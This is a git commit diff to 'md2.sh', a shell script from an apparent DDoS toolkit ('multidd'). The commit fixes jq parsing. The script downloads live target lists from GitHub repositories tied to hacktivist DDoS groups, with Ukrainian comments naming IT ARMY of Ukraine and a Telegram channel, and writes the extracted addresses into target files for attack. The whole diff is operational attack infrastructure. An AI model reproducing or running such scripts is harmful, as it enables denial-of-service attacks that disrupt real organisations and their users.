ceb87cd20aeaa73dad1ba797b8a50afad90b0937
uaripper <uaripper@mail.local>
2022-07-07 13:04:26 +0300

    fix ita parsing

--- md2.sh
+++ md2.sh
@@ -36,10 +36,9 @@ rm -rf ~/multidd/targets/*
 # 1 DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
 echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
 # 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
-echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > ~/multidd/targets/source2.txt
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.packet.payload.data.path | select (. != null)')" > ~/multidd/targets/source2.txt
 
-echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.connection.args.address | select (. != null
-)')" > ~/multidd/targets/source3.txt
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.connection.args.address | select (. != null)')" > ~/multidd/targets/source3.txt
 
 # remove all empty lines (spaces, tabs, new lines)
 sed -i '/^[[:space:]]*$/d' ~/multidd/targets/source*.txt
